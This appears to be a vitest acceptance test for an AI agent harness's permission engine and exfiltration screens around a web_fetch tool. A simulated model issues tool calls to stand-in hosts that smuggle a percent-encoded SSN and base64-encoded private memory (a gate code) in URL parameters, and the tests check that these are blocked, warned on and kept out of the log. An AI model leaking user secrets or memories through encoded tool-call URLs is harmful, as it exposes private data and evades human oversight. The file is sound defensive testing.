import fs from 'node:fs';
import http from 'node:http';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import {
  addGrant,
  createOpenAICompatibleProvider,
  createPermissionEngine,
  createSession,
  createWebFetchTool,
  listGrants,
  runTask,
} from '../packages/converse/dist/index.js';
import type {
  ApprovalRequest,
  ConverseVault,
  TaskEvent,
  TaskHooks,
  ToolDefinition,
} from '../packages/converse/dist/index.js';

/**
 * M10c acceptance — the ADR 0029 security engine — driving the BUILT
 * @northkeep/converse package end to end (same harness idiom as m10b):
 *  - an "always" answer at the prompt becomes a persisted grant, and the
 *    NEXT call to the same host auto-allows without a prompt, provenance
 *    visible in events and audit rows;
 *  - a tool-call URL smuggling a percent-encoded SSN is hard-blocked by the
 *    exfiltration screens BEFORE any gate or prompt, the model is told, and
 *    the audit row records content-free flag descriptors (the secret
 *    appears NOWHERE in the log, in any encoding);
 *  - a URL smuggling base64-encoded vault-memory content forces a WARNED
 *    prompt even when an "always" grant covers the host (screened calls
 *    never auto-allow);
 *  - a persisted "never" grant refuses without prompting.
 */

const repoRoot = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const distPath = path.join(repoRoot, 'packages', 'converse', 'dist', 'index.js');

let home: string;
let priorHome: string | undefined;
let fakeProvider: http.Server;
let fakeProviderUrl: string;
let pageServer: http.Server;
let pageUrl = ''; // http://page-fixture.test:<port>/doc

const MEMORY_CONTENT = 'Jay keeps the marina gate code 4417 in his private notes at the boathouse';
const SSN = '123-45-6789';
const SSN_ENCODED = '123%2D45%2D6789';
/** What a paraphrase-exfil attempt looks like: a chunk of the disclosed
 * memory, base64'd so the raw URL looks innocent at a glance. */
const MEMORY_LEAK_B64 = Buffer.from('marina gate code 4417 in his private notes').toString('base64');

const fakeVault: ConverseVault = {
  retrieve: () => [
    {
      entry: {
        id: 'mem-boathouse-1',
        type: 'fact',
        content: MEMORY_CONTENT,
        scope: 'personal',
        source: 'test',
        source_model: null,
        confidence: 1,
        created_at: '2026-07-01T00:00:00.000Z',
        valid_from: null,
        superseded_at: null,
        superseded_by: null,
        forgotten_at: null,
        prev_hash: '0'.repeat(64),
        entry_hash: '1'.repeat(64),
        metadata: null,
      },
      score: 0.99,
    },
  ],
  list: () => [],
  commit: () => [],
};

/** The user message carries a marker; the fake model requests the matching
 * URL. Round 2 (a tool message exists) answers from what the tool returned. */
function urlForMarker(marker: string): string {
  if (marker.includes('EXFIL-SSN')) return `https://blocked-fixture.test/lookup?id=${SSN_ENCODED}`;
  if (marker.includes('EXFIL-MEMORY')) return `https://blocked-fixture.test/share?d=${MEMORY_LEAK_B64}`;
  if (marker.includes('NEVER-SITE')) return 'https://never-fixture.test/page';
  return pageUrl; // clean fetch
}

beforeAll(async () => {
  expect(fs.existsSync(distPath), 'run pnpm build first').toBe(true);
  home = fs.mkdtempSync(path.join(os.tmpdir(), 'nk-m10c-'));
  priorHome = process.env.NORTHKEEP_HOME;
  process.env.NORTHKEEP_HOME = home;

  pageServer = http.createServer((req, res) => {
    res.setHeader('content-type', 'text/html; charset=utf-8');
    res.end('<html><body><p>NorthKeep keeps your memory in a vault you own.</p></body></html>');
  });
  await new Promise<void>((r) => pageServer.listen(0, '127.0.0.1', r));
  pageUrl = `http://page-fixture.test:${(pageServer.address() as { port: number }).port}/doc`;

  fakeProvider = http.createServer((req, res) => {
    let body = '';
    req.on('data', (c: Buffer) => (body += c.toString('utf8')));
    req.on('end', () => {
      const parsed = JSON.parse(body) as { messages: Array<{ role: string; content: string }> };
      res.setHeader('content-type', 'text/event-stream');
      const send = (payload: unknown) => res.write(`data: ${JSON.stringify(payload)}\n\n`);
      const toolMsg = parsed.messages.filter((m) => m.role === 'tool').at(-1);
      if (toolMsg !== undefined) {
        const ack = toolMsg.content.includes('blocked_exfiltration')
          ? 'The harness blocked that request.'
          : toolMsg.content.includes('permission_denied')
            ? 'Understood — not fetching that.'
            : 'The page says: your memory stays in a vault you own.';
        send({ choices: [{ delta: { content: ack } }] });
        send({ choices: [{ delta: {}, finish_reason: 'stop' }] });
      } else {
        const userMsg = parsed.messages.filter((m) => m.role === 'user').at(-1)!;
        const url = urlForMarker(userMsg.content);
        send({
          choices: [
            {
              delta: {
                tool_calls: [
                  {
                    index: 0,
                    id: 'call_1',
                    function: { name: 'web_fetch', arguments: JSON.stringify({ url }) },
                  },
                ],
              },
            },
          ],
        });
        send({ choices: [{ delta: {}, finish_reason: 'tool_calls' }] });
      }
      res.write('data: [DONE]\n\n');
      res.end();
    });
  });
  await new Promise<void>((r) => fakeProvider.listen(0, '127.0.0.1', r));
  fakeProviderUrl = `http://127.0.0.1:${(fakeProvider.address() as { port: number }).port}`;
});

afterAll(async () => {
  if (priorHome === undefined) delete process.env.NORTHKEEP_HOME;
  else process.env.NORTHKEEP_HOME = priorHome;
  fs.rmSync(home, { recursive: true, force: true });
  await new Promise((r) => fakeProvider.close(r));
  await new Promise((r) => pageServer.close(r));
});

function testWebFetch(): ToolDefinition {
  return createWebFetchTool({
    testOverrides: {
      allowHttp: true,
      resolver: (host: string) =>
        host === 'page-fixture.test'
          ? Promise.resolve([{ address: '127.0.0.1', family: 4 }])
          : Promise.reject(new Error(`no fake DNS for ${host}`)),
      isPrivateAddress: () => false,
    },
  });
}

function logRows(): Array<Record<string, unknown>> {
  return fs
    .readFileSync(path.join(home, 'mcp-calls.log'), 'utf8')
    .trim()
    .split('\n')
    .map((l) => JSON.parse(l) as Record<string, unknown>);
}

function runWith(message: string, hooks: TaskHooks, gate?: unknown) {
  return runTask({
    message,
    session: createSession(),
    provider: createOpenAICompatibleProvider({ baseUrl: fakeProviderUrl }),
    model: 'fake-model',
    vault: fakeVault,
    redactTier: 0,
    distill: false,
    tools: [testWebFetch()],
    hooks,
    ...(gate !== undefined ? { gate: gate as never } : {}),
  });
}

describe('M10c acceptance — permission engine + exfiltration screens', () => {
  it('an "always" answer persists a grant and the next call auto-allows, provenance audited', async () => {
    const engine = createPermissionEngine({ persist: true });
    const prompts: ApprovalRequest[] = [];
    const events: TaskEvent[] = [];
    const hooks: TaskHooks = {
      onEvent: (e) => events.push(e),
      requestApproval: (req) => {
        prompts.push(req);
        return Promise.resolve('allow-always');
      },
    };

    const first = await runWith('CLEAN fetch the about page please', hooks, engine);
    expect(first.toolCallsMade[0]!.decision).toBe('approved');
    expect(prompts).toHaveLength(1);
    expect(prompts[0]!.warnings).toEqual([]);

    // The grant is on disk, inspectable, and keyed exactly.
    const grants = listGrants();
    expect(grants).toEqual([
      expect.objectContaining({ tool: 'web_fetch', host: 'page-fixture.test', scope: 'always' }),
    ]);

    // Second task, SAME engine: no prompt, auto-allow, provenance 'grant'.
    const second = await runWith('CLEAN fetch it again', hooks, engine);
    expect(second.toolCallsMade[0]!.decision).toBe('approved');
    expect(prompts).toHaveLength(1); // no second prompt
    const autoEvent = events.filter(
      (e): e is Extract<TaskEvent, { type: 'permission' }> => e.type === 'permission',
    ).at(-1)!;
    expect(autoEvent.via).toBe('grant');

    // A FRESH engine (new process semantics) reads the persisted grant too.
    const engine2 = createPermissionEngine({ persist: true });
    const third = await runWith('CLEAN once more', hooks, engine2);
    expect(third.toolCallsMade[0]!.decision).toBe('approved');
    expect(prompts).toHaveLength(1);

    // Audit provenance: first row scope 'always', later rows 'auto'.
    const scopes = logRows()
      .filter((r) => r['tool_call'] !== undefined)
      .map((r) => (r['tool_call'] as { scope?: string }).scope);
    expect(scopes).toEqual(['always', 'auto', 'auto']);
  });

  it('a percent-encoded SSN in the URL hard-blocks before any prompt, content-free in the log', async () => {
    const prompts: ApprovalRequest[] = [];
    const events: TaskEvent[] = [];
    const hooks: TaskHooks = {
      onEvent: (e) => events.push(e),
      requestApproval: (req) => {
        prompts.push(req);
        return Promise.resolve('allow');
      },
    };

    const result = await runWith('EXFIL-SSN look up that id for me', hooks);
    expect(result.reply).toBe('The harness blocked that request.');
    expect(result.toolCallsMade[0]!.decision).toBe('denied');
    expect(prompts).toHaveLength(0); // never reached a human — hard deny

    const perm = events.find(
      (e): e is Extract<TaskEvent, { type: 'permission' }> => e.type === 'permission',
    )!;
    expect(perm.decision).toBe('denied');
    expect(perm.via).toBe('screen');
    expect(perm.reasons!.length).toBeGreaterThan(0);
    expect(perm.reasons!.join(' ')).not.toContain(SSN);

    const row = logRows()
      .filter((r) => r['tool_call'] !== undefined)
      .at(-1)! as { tool_call: { scope?: string; screen?: string[]; decision: string } };
    expect(row.tool_call.decision).toBe('denied');
    expect(row.tool_call.scope).toBe('screen');
    expect(row.tool_call.screen!.some((s) => s.startsWith('secret:'))).toBe(true);

    // The secret is NOWHERE in the log — raw, encoded, or in descriptors.
    const logText = fs.readFileSync(path.join(home, 'mcp-calls.log'), 'utf8');
    expect(logText).not.toContain(SSN);
    expect(logText).not.toContain(SSN_ENCODED);
    expect(logText).not.toContain('123456789');
  });

  it('base64-smuggled vault memory forces a WARNED prompt even with an always-grant on the host', async () => {
    addGrant('web_fetch', 'blocked-fixture.test', 'always');
    const engine = createPermissionEngine({ persist: true });
    const prompts: ApprovalRequest[] = [];
    const hooks: TaskHooks = {
      onEvent: () => {},
      requestApproval: (req) => {
        prompts.push(req);
        return Promise.resolve('deny');
      },
    };

    const result = await runWith('EXFIL-MEMORY share my notes summary', hooks, engine);
    // The grant did NOT auto-allow: the screened call reached the human.
    expect(prompts).toHaveLength(1);
    expect(prompts[0]!.warnings.length).toBeGreaterThan(0);
    expect(prompts[0]!.warnings.join(' ')).toContain('vault memories');
    expect(prompts[0]!.warnings.join(' ')).not.toContain('4417');
    expect(result.toolCallsMade[0]!.decision).toBe('denied');

    const row = logRows()
      .filter((r) => r['tool_call'] !== undefined)
      .at(-1)! as { tool_call: { screen?: string[] } };
    expect(row.tool_call.screen!.some((s) => s.startsWith('memory:'))).toBe(true);
  });

  it('a persisted "never" grant refuses without prompting', async () => {
    addGrant('web_fetch', 'never-fixture.test', 'never');
    const engine = createPermissionEngine({ persist: true });
    const prompts: ApprovalRequest[] = [];
    const events: TaskEvent[] = [];
    const hooks: TaskHooks = {
      onEvent: (e) => events.push(e),
      requestApproval: (req) => {
        prompts.push(req);
        return Promise.resolve('allow');
      },
    };

    const result = await runWith('NEVER-SITE fetch that blocked site', hooks, engine);
    expect(prompts).toHaveLength(0);
    expect(result.toolCallsMade[0]!.decision).toBe('denied');
    const perm = events.find(
      (e): e is Extract<TaskEvent, { type: 'permission' }> => e.type === 'permission',
    )!;
    expect(perm.via).toBe('grant');
    const row = logRows()
      .filter((r) => r['tool_call'] !== undefined)
      .at(-1)! as { tool_call: { scope?: string } };
    expect(row.tool_call.scope).toBe('never');
  });
});
